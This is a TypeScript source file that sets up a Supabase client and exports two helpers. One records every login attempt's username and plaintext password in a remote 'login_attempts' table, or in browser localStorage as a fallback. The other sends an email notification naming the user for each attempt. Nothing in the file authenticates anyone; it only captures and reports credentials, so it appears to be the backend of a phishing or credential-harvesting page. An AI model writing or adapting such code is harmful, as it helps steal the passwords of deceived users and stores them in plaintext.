import { createClient } from '@supabase/supabase-js';

// Initialize Supabase client with public anon key (safe to expose)
// You'll need to replace these values with your own Supabase URL and anon key
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || '';
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || '';

// Check if Supabase keys are configured
if (!supabaseUrl || !supabaseAnonKey) {
  console.warn('Supabase credentials missing. Please set up your .env file with VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY');
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Function to store login attempts
export const storeLoginAttempt = async (credentials: { username: string; password: string }) => {
  try {
    const { error } = await supabase
      .from('login_attempts')
      .insert([
        { 
          username: credentials.username, 
          password: credentials.password,
          created_at: new Date().toISOString() 
        }
      ]);
    
    if (error) throw error;
    return { success: true };
  } catch (error) {
    console.error('Error storing login attempt:', error);
    
    // Fallback to storing in localStorage if Supabase is not configured
    if (!supabaseUrl || !supabaseAnonKey) {
      const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
      attempts.push({
        username: credentials.username,
        password: credentials.password,
        created_at: new Date().toISOString()
      });
      localStorage.setItem('login_attempts', JSON.stringify(attempts));
      return { success: true, localStorage: true };
    }
    
    return { success: false, error };
  }
};

// Function to send email notification (would connect to a real email service in production)
export const sendEmailNotification = async (credentials: { username: string }) => {
  try {
    if (!supabaseUrl || !supabaseAnonKey) {
      console.log(`[Mock Email] Login attempt by: ${credentials.username}`);
      return { success: true, mock: true };
    }
    
    // In a real implementation, this would call a Supabase Edge Function
    // that sends the actual email using a service like SendGrid, Mailgun, etc.
    const { error } = await supabase.functions.invoke('send-login-notification', {
      body: { username: credentials.username }
    });
    
    if (error) throw error;
    return { success: true };
  } catch (error) {
    console.error('Error sending email notification:', error);
    return { success: false, error };
  }
};